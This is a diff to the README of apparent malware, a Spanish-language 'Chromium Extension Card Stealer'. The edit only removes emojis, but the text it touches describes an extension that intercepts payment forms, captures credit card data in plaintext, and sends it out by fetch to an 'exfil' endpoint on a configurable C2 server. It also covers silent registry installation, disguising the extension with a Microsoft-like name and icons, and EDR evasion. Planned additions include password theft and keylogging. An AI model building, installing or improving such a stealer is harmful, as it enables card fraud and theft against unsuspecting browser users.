@@ -1,31 +1,31 @@
-# 🎯 Chromium Extension Card Stealer
+#  Chromium Extension Card Stealer
 
-## 📋 Overview
+##  Overview
 
 Extensión **completamente indetectable** para Chrome, Edge, Brave y Opera que roba tarjetas de crédito bypaseando App-Bound Encryption (v20).
 
-## ✅ Ventajas
+##  Ventajas
 
-### 🔒 100% Indetectable
+###  100% Indetectable
 - **Sin inyección de código** en procesos
 - **Sin hooks** de APIs del sistema
 - **Sin modificación de archivos** del navegador
 - **APIs legítimas** del navegador
 
-### 🌐 Compatible con Todos los Chromium
-- ✅ Google Chrome
-- ✅ Microsoft Edge  
-- ✅ Brave Browser
-- ✅ Opera
-- ✅ Vivaldi
-- ✅ Cualquier Chromium-based browser
+###  Compatible con Todos los Chromium
+-  Google Chrome
+-  Microsoft Edge
+-  Brave Browser
+-  Opera
+-  Vivaldi
+-  Cualquier Chromium-based browser
 
-### 🎯 Bypass Completo de v20
+###  Bypass Completo de v20
 - **App-Bound Encryption** → **BYPASSEADO**
 - Navegador desencripta por nosotros
 - Capturamos datos en **plaintext**
 
-## 🚀 Cómo Funciona
+##  Cómo Funciona
 
 ### 1. Intercepta Formularios
 ```javascript
@@ -55,7 +55,7 @@ fetch('http://localhost:4444/exfil', {
 });
 ```
 
-## 📦 Instalación
+##  Instalación
 
 ### Método 1: Registry (Silencioso)
 
@@ -82,7 +82,7 @@ println!("Instalado en: {:?}", installed);
 4. "Load unpacked"
 5. Seleccionar carpeta `chromium-extension/`
 
-## 📊 Datos Capturados
+##  Datos Capturados
 
 ```json
 {
@@ -105,7 +105,7 @@ println!("Instalado en: {:?}", installed);
 }
 ```
 
-## 🔧 Configuración
+##  Configuración
 
 ### Cambiar URL del C2
 
@@ -131,7 +131,7 @@ Editar `manifest.json`:
 }
 ```
 
-## 🎭 Evasión
+##  Evasión
 
 ### Nombre Legítimo
 ```
@@ -146,31 +146,31 @@ Usar iconos que parezcan de Windows/Microsoft
 ### Sin Permisos Sospechosos
 ```json
 "permissions": [
-  "storage",    // ✅ Común
-  "tabs",       // ✅ Común
-  "webRequest"  // ✅ Común
+  "storage",    //  Común
+  "tabs",       //  Común
+  "webRequest"  //  Común
 ]
 ```
 
-## 🛡️ Defensa contra EDR
+##  Defensa contra EDR
 
-### ✅ Comportamiento Legítimo
+###  Comportamiento Legítimo
 - Extensión = Feature del navegador
 - APIs documentadas de Chrome
 - Sin syscalls sospechosos
 - Sin memory injection
 
-### ✅ Network Traffic Normal
+###  Network Traffic Normal
 - HTTPS regular a tu C2
 - Parece tráfico web normal
 - No usa puertos extraños
 
-### ✅ Persistencia Natural
+###  Persistencia Natural
 - Registry keys de usuario (no sistema)
 - No requiere admin
 - Sobrevive reinicios
 
-## 📈 Mejoras Futuras
+##  Mejoras Futuras
 
 - [ ] Capturar passwords también
 - [ ] Keylogging selectivo en campos de pago
@@ -179,13 +179,13 @@ Usar iconos que parezcan de Windows/Microsoft
 - [ ] Clipboard monitoring
 - [ ] WebAuthn bypass
 
-## ⚠️ Limitaciones
+##  Limitaciones
 
 - **Requiere navegador abierto** (extensión solo funciona con navegador activo)
 - **Usuario puede verla** en `chrome://extensions` (solución: nombre legítimo)
 - **Puede ser removida** si usuario la nota
 
-## 🔐 Contramedidas
+##  Contramedidas
 
 Para protegerse de esta técnica:
 
@@ -196,4 +196,4 @@ Para protegerse de esta técnica:
 
 ---
 
-**⚡ RESULTADO**: Bypass completo de App-Bound Encryption sin tocar el proceso del navegador.
+** RESULTADO**: Bypass completo de App-Bound Encryption sin tocar el proceso del navegador.
